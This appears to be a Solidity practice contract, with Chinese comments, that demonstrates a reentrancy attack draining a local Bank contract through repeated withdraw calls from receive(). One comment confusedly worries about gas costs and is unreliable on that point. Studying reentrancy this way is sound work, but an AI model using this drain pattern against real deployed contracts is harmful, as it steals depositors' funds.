// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.18;

import {Bank} from "./Bank.sol";

contract Eval {
    Bank public bank; // Bank合约地址

    constructor(Bank _bank) {
        bank = _bank;
    }

    //回调函数 ，因为在Bank合约中 calldata为空，所以会调到receive函数
    receive() external payable {
        // 如果银行有钱就一直取钱
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        // 存钱的时候只会存 1 eth ，取钱的时候就会只取 1eth
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        // 因为调用者在调用attack的时候，已经向合约转了1 eth
        // 所以这个时候bank的msg.sender是合约的地址，但是合约是有1eth,所以可以存 1 eth
        // 但是这个时候是有个问题的，调用bank.deposit的时候按理说是需要消耗gas的，所以合约如果只有 1eth应该是不够的
        // 这里是使用eval模拟的网络，所以可能不消耗gas？？？
        bank.deposit{value: 1 ether}();
        //然后就开始取钱
        bank.withdraw();
    }
    // 获取当前合约的余额

    function getBanlance() external view returns (uint256) {
        return address(this).balance;
    }
}
